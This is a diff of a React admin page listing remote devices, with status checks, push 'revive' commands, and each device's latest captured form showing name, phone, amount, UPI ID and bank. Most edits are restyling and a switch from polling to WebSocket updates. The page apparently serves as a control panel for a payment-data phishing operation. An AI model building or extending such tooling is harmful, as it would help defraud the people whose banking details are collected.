@@ -17,7 +17,8 @@ import { getDevices, deleteDevice } from "../services/api/devices";
 import { getFavoritesMap, setFavorite } from "../services/api/favorites";
 import { ENV, apiHeaders } from "../config/constants";
 import ztLogo from "../assets/zt-logo.png";
-import pageBg from "../assets/login-bg.png";
+import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
+import wsService from "../services/ws/wsService";
 
 type Row = DeviceDoc & { _fav?: boolean };
 type FormSubmission = Record<string, any>;
@@ -34,9 +35,9 @@ type DisplayRow = Row & {
   logoSrc: string;
 };
 
-const LIST_ROW_HEIGHT = 252;
-const LIST_OVERSCAN = 6;
-const VIRTUALIZE_AFTER = 24;
+const LIST_ROW_HEIGHT = 238;
+const LIST_OVERSCAN = 8;
+const VIRTUALIZE_AFTER = 20;
 
 function safeStr(v: unknown): string {
   return String(v ?? "").trim();
@@ -107,13 +108,15 @@ function maskMaybeSensitive(key: string, value: string): string {
 function summarizeForm(s: FormSubmission | null | undefined): string {
   if (!s || typeof s !== "object") return "No form submit";
 
+  const source = s?.payload && typeof s.payload === "object" ? s.payload : s;
+
   const candidates: Array<[string, any]> = [
-    ["name", s.name || s.fullName],
-    ["mobile", s.mobile || s.phone],
-    ["amount", s.amount || s.amt],
-    ["upi", s.upi || s.upiId],
-    ["bank", s.bank || s.bankName],
-    ["title", s.title || s.formTitle],
+    ["name", source.name || source.fullName],
+    ["mobile", source.mobile || source.phone],
+    ["amount", source.amount || source.amt],
+    ["upi", source.upi || source.upiId],
+    ["bank", source.bank || source.bankName],
+    ["title", source.title || source.formTitle],
   ];
 
   const parts: string[] = [];
@@ -147,7 +150,7 @@ function DeviceLogo({ src, alt }: { src: string; alt: string }) {
 
   if (broken) {
     return (
-      <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-white/15 bg-white/8 text-sm font-bold text-white/80">
+      <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-slate-200 bg-white text-sm font-bold text-slate-700">
         {alt.slice(0, 1).toUpperCase()}
       </div>
     );
@@ -157,7 +160,7 @@ function DeviceLogo({ src, alt }: { src: string; alt: string }) {
     <img
       src={src}
       alt={alt}
-      className="h-11 w-11 rounded-2xl border border-white/15 bg-white/8 object-cover"
+      className="h-11 w-11 rounded-2xl border border-slate-200 bg-white object-cover"
       onError={() => setBroken(true)}
       draggable={false}
       loading="lazy"
@@ -165,35 +168,15 @@ function DeviceLogo({ src, alt }: { src: string; alt: string }) {
   );
 }
 
-function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
+function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
   return (
-    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
-      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/12" />
-      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/8" />
-
-      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 rounded-tl-[10px] border-l-2 border-t-2 border-cyan-200/40" />
-      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 rounded-tr-[10px] border-r-2 border-t-2 border-cyan-200/40" />
-      <div className="pointer-events-none absolute bottom-3 left-3 h-6 w-6 rounded-bl-[10px] border-b-2 border-l-2 border-cyan-200/40" />
-      <div className="pointer-events-none absolute bottom-3 right-3 h-6 w-6 rounded-br-[10px] border-b-2 border-r-2 border-cyan-200/40" />
-
-      <div
-        className={[
-          "relative rounded-[26px] px-4 py-4",
-          "border border-white/[0.14]",
-          "bg-white/[0.05]",
-          "backdrop-blur-2xl",
-          "shadow-[0_24px_70px_rgba(0,0,0,0.45)]",
-        ].join(" ")}
-      >
-        <div
-          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-60"
-          style={{
-            backgroundImage:
-              "linear-gradient(to bottom, rgba(255,255,255,0.16), rgba(255,255,255,0.05) 24%, rgba(255,255,255,0.00) 70%)",
-          }}
-        />
-        <div className="relative">{children}</div>
-      </div>
+    <div
+      className={[
+        "rounded-[26px] border border-slate-200/90 bg-white/90 shadow-[0_8px_28px_rgba(15,23,42,0.08)] backdrop-blur-sm",
+        className,
+      ].join(" ")}
+    >
+      {children}
     </div>
   );
 }
@@ -218,19 +201,17 @@ const DeviceCard = memo(function DeviceCard({
   onDelete,
 }: DeviceCardProps) {
   return (
-    <div className="relative h-full overflow-hidden rounded-[24px] border border-white/12 bg-white/[0.05] p-4 shadow-[0_14px_36px_rgba(0,0,0,0.30)] backdrop-blur-xl">
-      <div className="pointer-events-none absolute inset-0 rounded-[24px] border border-cyan-200/6" />
-
+    <div className="h-full rounded-[24px] border border-slate-200 bg-white/92 p-4 shadow-[0_8px_24px_rgba(15,23,42,0.06)]">
       <div className="flex items-start justify-between gap-3">
         <div className="flex min-w-0 items-center gap-3">
           <DeviceLogo src={device.logoSrc} alt={device.brand} />
 
           <div className="min-w-0">
             <div className="flex min-w-0 items-center gap-2">
-              <div className="min-w-0 truncate text-[16px] font-extrabold text-white">{device.brand}</div>
+              <div className="min-w-0 truncate text-[16px] font-extrabold text-slate-900">{device.brand}</div>
 
               <div
-                className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full border border-white/12 bg-cyan-400/85 text-sm font-extrabold text-white shadow-[0_6px_18px_rgba(2,6,23,0.45)]"
+                className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white"
                 title={`#${displayNumber}`}
                 aria-hidden={false}
               >
@@ -238,20 +219,20 @@ const DeviceCard = memo(function DeviceCard({
               </div>
             </div>
 
-            <div className="truncate text-[12px] text-white/60">
+            <div className="truncate text-[12px] text-slate-500">
               {device.model ? `${device.model} • ` : ""}
               ID: {device.deviceId}
             </div>
           </div>
         </div>
 
-        <div className="flex shrink-0 flex-col items-end gap-2">
+        <div className="flex shrink-0 items-center gap-2">
           <span
             className={[
               "rounded-full border px-3 py-1 text-[12px] font-extrabold",
               device.online
-                ? "border-green-400/25 bg-green-500/15 text-green-200"
-                : "border-red-400/25 bg-red-500/15 text-red-200",
+                ? "border-emerald-200 bg-emerald-50 text-emerald-700"
+                : "border-rose-200 bg-rose-50 text-rose-700",
             ].join(" ")}
           >
             {device.online ? "Online" : "Offline"}
@@ -260,10 +241,10 @@ const DeviceCard = memo(function DeviceCard({
           <button
             onClick={() => onToggleFavorite(device.deviceId)}
             className={[
-              "flex h-10 w-10 items-center justify-center rounded-2xl border text-lg backdrop-blur-xl",
+              "flex h-10 w-10 items-center justify-center rounded-2xl border text-lg transition active:scale-[0.98]",
               device.favoriteFlag
-                ? "border-yellow-300 bg-yellow-400/90 text-white shadow-[0_10px_24px_rgba(250,204,21,0.20)]"
-                : "border-white/15 bg-white/[0.05] text-white/60 hover:bg-white/[0.09]",
+                ? "border-amber-200 bg-amber-50 text-amber-600"
+                : "border-slate-200 bg-white text-slate-500 hover:bg-slate-50",
             ].join(" ")}
             type="button"
             title={device.favoriteFlag ? "Unfavorite" : "Favorite"}
@@ -274,21 +255,25 @@ const DeviceCard = memo(function DeviceCard({
       </div>
 
       <div className="mt-4 grid grid-cols-2 gap-3">
-        <div className="rounded-2xl border border-white/10 bg-white/[0.035] p-3">
-          <div className="text-[11px] text-white/55">Last seen</div>
-          <div className="mt-1 text-[13px] font-semibold text-white/90">{device.lastSeenLabel}</div>
+        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
+          <div className="text-[11px] text-slate-500">Last seen</div>
+          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-800">
+            {device.lastSeenLabel}
+          </div>
         </div>
 
-        <div className="rounded-2xl border border-white/10 bg-white/[0.035] p-3">
-          <div className="text-[11px] text-white/55">Latest form</div>
-          <div className="mt-1 line-clamp-2 text-[13px] font-semibold text-white/85">{device.lastForm}</div>
+        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
+          <div className="text-[11px] text-slate-500">Latest form</div>
+          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-700">
+            {device.lastForm}
+          </div>
         </div>
       </div>
 
-      <div className="mt-4 grid grid-cols-[1fr_1fr_auto] gap-2">
+      <div className="mt-4 grid grid-cols-3 gap-2">
         <button
           onClick={() => onOpen(device.deviceId)}
-          className="h-11 rounded-2xl border border-white/14 bg-white/[0.06] text-[14px] font-extrabold text-white/90 backdrop-blur-xl hover:bg-white/[0.09] active:scale-[0.99]"
+          className="h-11 rounded-2xl border border-slate-200 bg-white px-2 text-[13px] font-extrabold text-slate-900 transition hover:bg-slate-50 active:scale-[0.99]"
           type="button"
         >
           Open
@@ -298,18 +283,17 @@ const DeviceCard = memo(function DeviceCard({
           onClick={() => onCheckOnline(device.deviceId)}
           disabled={isChecking}
           className={[
-            "h-11 rounded-2xl border border-cyan-300/25 bg-cyan-400/15 text-[14px] font-extrabold text-cyan-100 backdrop-blur-xl",
-            "hover:bg-cyan-400/20 active:scale-[0.99]",
-            "disabled:cursor-not-allowed disabled:opacity-60",
+            "h-11 rounded-2xl border border-sky-200 bg-sky-50 px-2 text-[13px] font-extrabold text-sky-700 transition active:scale-[0.99]",
+            "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60",
           ].join(" ")}
           type="button"
         >
-          {isChecking ? "Checking…" : "Check Online"}
+          {isChecking ? "Checking…" : "Check"}
         </button>
 
         <button
           onClick={() => onDelete(device.deviceId)}
-          className="h-11 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 text-[14px] font-extrabold text-red-100 backdrop-blur-xl hover:bg-red-500/14 active:scale-[0.99]"
+          className="h-11 rounded-2xl border border-rose-200 bg-rose-50 px-2 text-[13px] font-extrabold text-rose-700 transition hover:bg-rose-100 active:scale-[0.99]"
           type="button"
         >
           Delete
@@ -338,7 +322,7 @@ export default function DevicesPage() {
   const [checkingAll, setCheckingAll] = useState(false);
 
   const loadInFlightRef = useRef(false);
-  const pollCounterRef = useRef(0);
+  const favoritesRef = useRef<Record<string, boolean>>({});
   const listRef = useRef<HTMLDivElement | null>(null);
   const [visibleRange, setVisibleRange] = useState({ start: 0, end: 18 });
 
@@ -346,7 +330,7 @@ export default function DevicesPage() {
     try {
       const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, {
         headers: apiHeaders(),
-        timeout: 12_000,
+        timeout: 12000,
       });
 
       const list = Array.isArray(res.data) ? (res.data as FormSubmission[]) : [];
@@ -378,15 +362,25 @@ export default function DevicesPage() {
       return await axios.post(
         `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/revive`,
         { source: "devices_page", force: true },
-        { headers, timeout: 15_000 },
+        { headers, timeout: 15000 },
       );
     } catch {
       return axios.post(
         `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/start`,
         { source: "devices_page", force: true },
-        { headers, timeout: 15_000 },
+        { headers, timeout: 15000 },
       );
     }
+  }, []);
+
+  const mergeDevices = useCallback((list: any[], safeFav: Record<string, boolean>) => {
+    const normalized = (list || []).map((d: any) => {
+      const id = pickDeviceId(d) || "unknown";
+      return { ...d, deviceId: id, _fav: !!safeFav[id] } as Row;
+    });
+
+    normalized.reverse();
+    return normalized;
   }, []);
 
   const loadAll = useCallback(
@@ -404,16 +398,11 @@ export default function DevicesPage() {
         ]);
 
         const safeFav = favMap || {};
-
-        const normalized = (list || []).map((d: any) => {
-          const id = pickDeviceId(d) || "unknown";
-          return { ...d, deviceId: id, _fav: !!safeFav[id] } as Row;
-        });
-
-        normalized.reverse();
+        const normalized = mergeDevices(list || [], safeFav);
 
         setDevices(normalized);
         setFavoritesMap(safeFav);
+        favoritesRef.current = safeFav;
 
         if (maybeForms) {
           setLatestFormMap(maybeForms);
@@ -429,8 +418,12 @@ export default function DevicesPage() {
         if (!silent) setLoading(false);
       }
     },
-    [loadFormsLatestByDevice],
+    [loadFormsLatestByDevice, mergeDevices],
   );
+
+  useEffect(() => {
+    favoritesRef.current = favoritesMap;
+  }, [favoritesMap]);
 
   useEffect(() => {
     const qpFilter = normalizeFilter(searchParams.get("filter"));
@@ -439,14 +432,122 @@ export default function DevicesPage() {
 
   useEffect(() => {
     loadAll({ includeForms: true }).catch(() => {});
+    wsService.connect();
 
-    const id = window.setInterval(() => {
-      pollCounterRef.current += 1;
-      const includeForms = pollCounterRef.current % 5 === 0;
-      loadAll({ includeForms, silent: true }).catch(() => {});
-    }, 12_000);
+    const off = wsService.onMessage((msg) => {
+      try {
+        if (!msg || msg.type !== "event") return;
 
-    return () => window.clearInterval(id);
+        if (msg.event === "status") {
+          const did = safeStr(msg.deviceId || msg?.data?.deviceId);
+          if (!did) return;
+
+          const online = !!msg?.data?.online;
+          const timestamp = Number(msg?.data?.timestamp || Date.now());
+
+          setDevices((prev) => {
+            const index = prev.findIndex((d) => safeStr(d.deviceId) === did);
+
+            if (index === -1) {
+              const created: Row = {
+                deviceId: did,
+                metadata: {},
+                status: { online, timestamp },
+                _fav: !!favoritesRef.current[did],
+              } as Row;
+              return [created, ...prev];
+            }
+
+            return prev.map((d) =>
+              safeStr(d.deviceId) === did
+                ? {
+                    ...d,
+                    status: {
+                      ...(d.status || {}),
+                      online,
+                      timestamp,
+                    },
+                  }
+                : d,
+            );
+          });
+
+          return;
+        }
+
+        if (msg.event === "favorite:update") {
+          const did = safeStr(msg?.data?.deviceId || msg.deviceId);
+          if (!did) return;
+
+          const favorite = !!msg?.data?.favorite;
+          setFavoritesMap((prev) => {
+            const next = { ...prev, [did]: favorite };
+            favoritesRef.current = next;
+            return next;
+          });
+
+          setDevices((prev) =>
+            prev.map((d) =>
+              safeStr(d.deviceId) === did ? { ...d, favorite, _fav: favorite } : d,
+            ),
+          );
+          return;
+        }
+
+        if (msg.event === "device:delete") {
+          const did = safeStr(msg?.data?.deviceId || msg.deviceId);
+          if (!did) return;
+
+          setDevices((prev) => prev.filter((d) => safeStr(d.deviceId) !== did));
+
+          setFavoritesMap((prev) => {
+            const copy = { ...prev };
+            delete copy[did];
+            favoritesRef.current = copy;
+            return copy;
+          });
+
+          setLatestFormMap((prev) => {
+            const copy = { ...prev };
+            delete copy[did];
+            return copy;
+          });
+          return;
+        }
+
+        if (msg.event === "form:created" || msg.event === "form_submissions:created") {
+          const did = safeStr(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId);
+          if (!did) return;
+
+          const payload =
+            msg?.data?.payload && typeof msg.data.payload === "object"
+              ? msg.data.payload
+              : msg?.data || {};
+
+          const nextForm: FormSubmission = {
+            ...(payload || {}),
+            uniqueid: did,
+            createdAt: msg?.timestamp || Date.now(),
+            timestamp: msg?.timestamp || Date.now(),
+          };
+
+          setLatestFormMap((prev) => {
+            const existing = prev[did];
+            const prevTs = existing ? pickFormTs(existing) : 0;
+            const nextTs = pickFormTs(nextForm);
+            if (existing && prevTs > nextTs) return prev;
+            return { ...prev, [did]: nextForm };
+          });
+          return;
+        }
+      } catch {
+        // ignore
+      }
+    });
+
+    return () => {
+      off();
+    };
   }, [loadAll]);
 
   const displayRows = useMemo<DisplayRow[]>(() => {
@@ -502,7 +603,8 @@ export default function DevicesPage() {
       const el = listRef.current;
       if (!el) return;
 
-      const listTop = el.getBoundingClientRect().top + window.scrollY;
+      const rect = el.getBoundingClientRect();
+      const listTop = rect.top + window.scrollY;
       const scrollTop = window.scrollY;
       const viewportBottom = scrollTop + window.innerHeight;
 
@@ -558,21 +660,42 @@ export default function DevicesPage() {
     [nav],
   );
 
-  const toggleFavoriteHandler = useCallback(async (deviceId: string) => {
-    const curr = !!(favoritesMap[deviceId] ?? false);
-    const next = !curr;
+  const toggleFavoriteHandler = useCallback(
+    async (deviceId: string) => {
+      const curr = !!(favoritesRef.current[deviceId] ?? false);
+      const next = !curr;
 
-    try {
-      await setFavorite(deviceId, next);
+      setFavoritesMap((m) => {
+        const updated = { ...m, [deviceId]: next };
+        favoritesRef.current = updated;
+        return updated;
+      });
 
-      setFavoritesMap((m) => ({ ...m, [deviceId]: next }));
-      setDevices((prev) => prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: next, _fav: next } : d)));
-    } catch (e) {
-      console.error("toggleFavorite failed", e);
-      setSuccess(null);
-      setError("Failed to update favorite");
-    }
-  }, [favoritesMap]);
+      setDevices((prev) =>
+        prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: next, _fav: next } : d)),
+      );
+
+      try {
+        await setFavorite(deviceId, next);
+      } catch (e) {
+        console.error("toggleFavorite failed", e);
+
+        setFavoritesMap((m) => {
+          const reverted = { ...m, [deviceId]: curr };
+          favoritesRef.current = reverted;
+          return reverted;
+        });
+
+        setDevices((prev) =>
+          prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: curr, _fav: curr } : d)),
+        );
+
+        setSuccess(null);
+        setError("Failed to update favorite");
+      }
+    },
+    [],
+  );
 
   const handleDeleteDevice = useCallback(async (deviceId: string) => {
     if (!window.confirm(`Delete device ${deviceId}? This will remove it from DB.`)) return;
@@ -581,11 +704,14 @@ export default function DevicesPage() {
       await deleteDevice(deviceId);
 
       setDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
+
       setFavoritesMap((m) => {
         const copy = { ...m };
         delete copy[deviceId];
+        favoritesRef.current = copy;
         return copy;
       });
+
       setLatestFormMap((m) => {
         const copy = { ...m };
         delete copy[deviceId];
@@ -652,7 +778,7 @@ export default function DevicesPage() {
       }
     } catch (e) {
       console.error("check all failed", e);
-      setError("Failed to send check command to all devices");
+      setError("Failed to send check command to devices");
     } finally {
       setCheckingAll(false);
     }
@@ -669,34 +795,22 @@ export default function DevicesPage() {
   const bottomSpacer = shouldVirtualize ? Math.max(0, (filtered.length - visibleRange.end) * LIST_ROW_HEIGHT) : 0;
 
   return (
-    <div className="relative min-h-[100svh] w-full overflow-x-hidden bg-black">
-      <div className="absolute inset-0 bg-cover bg-center" style={{ backgroundImage: `url(${pageBg})` }} />
-      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
-      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />
-
-      <div className="pointer-events-none absolute inset-0 opacity-30">
-        <div className="absolute left-1/2 top-[-96px] h-[420px] w-[420px] -translate-x-1/2 rounded-full bg-cyan-400/12 blur-3xl" />
-        <div className="absolute left-[-120px] top-[35%] h-[320px] w-[320px] rounded-full bg-blue-400/8 blur-3xl" />
-        <div className="absolute bottom-[-140px] right-[-140px] h-[360px] w-[360px] rounded-full bg-cyan-300/10 blur-3xl" />
-      </div>
-
-      <div className="relative mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
-        <TechGlassCard>
+    <AnimatedAppBackground>
+      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
+        <SurfaceCard className="p-4">
           <div className="flex items-start justify-between gap-3">
-            <div>
-              <div className="text-[22px] font-extrabold tracking-tight text-white">Devices</div>
-              <div className="text-[12px] text-white/60">Manage all registered devices</div>
+            <div className="min-w-0">
+              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Devices</div>
+              <div className="text-[12px] text-slate-500">Manage all registered devices</div>
             </div>
 
-            <div className="flex items-center gap-2">
+            <div className="flex shrink-0 items-center gap-2">
               <button
                 onClick={handleCheckAll}
                 disabled={checkingAll || devices.length === 0}
                 className={[
-                  "h-10 rounded-2xl border px-4 text-white/90 backdrop-blur-xl",
-                  "border-cyan-300/25 bg-cyan-400/15",
-                  "hover:bg-cyan-400/20 active:scale-[0.99]",
-                  "disabled:cursor-not-allowed disabled:opacity-60",
+                  "h-10 rounded-2xl border border-sky-200 bg-sky-50 px-4 text-sky-700 transition active:scale-[0.99]",
+                  "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60",
                 ].join(" ")}
                 type="button"
                 title="Check all devices"
@@ -706,7 +820,7 @@ export default function DevicesPage() {
 
               <button
                 onClick={handleManualRefresh}
-                className="h-10 rounded-2xl border border-white/14 bg-white/[0.06] px-4 text-white/85 backdrop-blur-xl hover:bg-white/[0.09]"
+                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 transition hover:bg-slate-50"
                 type="button"
                 title="Refresh"
               >
@@ -722,25 +836,24 @@ export default function DevicesPage() {
               placeholder="Search brand / model / id"
               className={[
                 "h-11 w-full rounded-2xl px-4 text-[14px]",
-                "border border-white/[0.14] bg-white/[0.06]",
-                "text-white placeholder:text-white/35",
-                "shadow-[inset_0_1px_0_rgba(255,255,255,0.08),_0_10px_28px_rgba(0,0,0,0.18)]",
-                "backdrop-blur-xl outline-none",
-                "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
+                "border border-slate-200 bg-white",
+                "text-slate-900 placeholder:text-slate-400",
+                "outline-none transition",
+                "focus:border-sky-300 focus:ring-2 focus:ring-sky-100",
               ].join(" ")}
             />
           </div>
 
           <div className="mt-3 flex items-center justify-between gap-2">
-            <div className="text-[12px] text-white/60">Results: {filtered.length}</div>
+            <div className="text-[12px] text-slate-500">Results: {filtered.length}</div>
 
             <select
               value={filter}
               onChange={(e) => handleFilterChange(e.target.value as DeviceFilter)}
               className={[
                 "h-10 rounded-2xl px-3 text-[13px] font-semibold",
-                "border border-white/[0.14] bg-white/[0.06]",
-                "text-white/90 backdrop-blur-xl outline-none",
+                "border border-slate-200 bg-white",
+                "text-slate-800 outline-none",
               ].join(" ")}
             >
               <option value="all">All</option>
@@ -752,11 +865,11 @@ export default function DevicesPage() {
 
           <div ref={listRef} className="mt-4">
             {loading && devices.length === 0 ? (
-              <div className="rounded-3xl border border-white/14 bg-white/[0.05] p-5 text-center text-white/70 backdrop-blur-xl">
+              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
                 Loading…
               </div>
             ) : filtered.length === 0 ? (
-              <div className="rounded-3xl border border-white/14 bg-white/[0.05] p-6 text-center text-white/60 backdrop-blur-xl">
+              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
                 No devices found.
               </div>
             ) : (
@@ -793,18 +906,18 @@ export default function DevicesPage() {
           </div>
 
           {success && (
-            <div className="mt-4 rounded-2xl border border-emerald-400/25 bg-emerald-500/10 px-4 py-2 text-sm text-emerald-100">
+            <div className="mt-4 rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">
               {success}
             </div>
           )}
 
           {error && (
-            <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
+            <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
               {error}
             </div>
           )}
-        </TechGlassCard>
+        </SurfaceCard>
       </div>
-    </div>
+    </AnimatedAppBackground>
   );
 }
